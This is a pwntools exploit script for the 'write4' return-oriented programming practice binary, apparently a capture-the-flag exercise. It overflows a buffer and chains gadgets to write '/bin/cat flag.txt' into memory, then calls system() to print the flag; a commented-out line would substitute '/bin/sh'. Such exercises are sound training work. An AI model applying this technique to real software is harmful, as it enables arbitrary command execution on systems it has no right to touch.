#!/usr/bin/env python3

from pwn import *

context(terminal=['tmux','new-window'],os='linux',arch='amd64')
#p = gdb.debug('./write4','b main \n b pwnme \n b *0x400810 \n b *0x400805')
p = process('./write4')
#context.log_level = 'DEBUG'

junk = ("A"* 40).encode()
system = p64(0x400810) #plt is 0x4005e0
main = p64(0x400746)
data1 = p64(0x601050) #first 8bytes of str
data2 = p64(0x601050+0x8) #next *bytes of str
data3 = p64(0x601050+0x10) #last set of bytes of str
#0x0000000000400893: pop rdi; ret;
pop_rdi = p64(0x400893)
#0x0000000000400890: pop r14; pop r15; ret;
pop_r14_r15 = p64(0x400890)
#0x0000000000400820: mov qword ptr [r14], r15; ret;
pop_r15_into_r14lea = p64(0x400820)
cat1 = "/bin/cat".encode()
cat2 = "\x20flag.tx".encode()
#fill out to 8bytes with null bytes so following commands are not offset and will ex properly
#cat3 = "t\x00\x00\x00\x00\x00\x00\x00".encode()
cat3 = "t".ljust(8,"\x00").encode()
#cat = "/bin/sh\x00".encode()
#write first 8bytes of string to first 8bytes of memory
load_str_into_memP1 = pop_r14_r15+data1+cat1+pop_r15_into_r14lea
#write next 8bytes of string to next 8bytes of memory
load_str_into_memP2 = pop_r14_r15+data2+cat2+pop_r15_into_r14lea
#write next 8bytes of string to next 8bytes of memory
load_str_into_memP3 = pop_r14_r15+data3+cat3+pop_r15_into_r14lea
#join all into one var
load_str = load_str_into_memP1 + load_str_into_memP2 + load_str_into_memP3

p.recvuntil('>')
#load str(/bin/cat flag.txt) into meomory
#pop memory addr into rdi aka arg0
#then call system which executes the string
p.sendline(junk+load_str+pop_rdi+data1+system)
p.recvuntil(' ')
flag = p.recv()
log.success("Flag: "+flag.decode('ascii'))
#p.interactive()
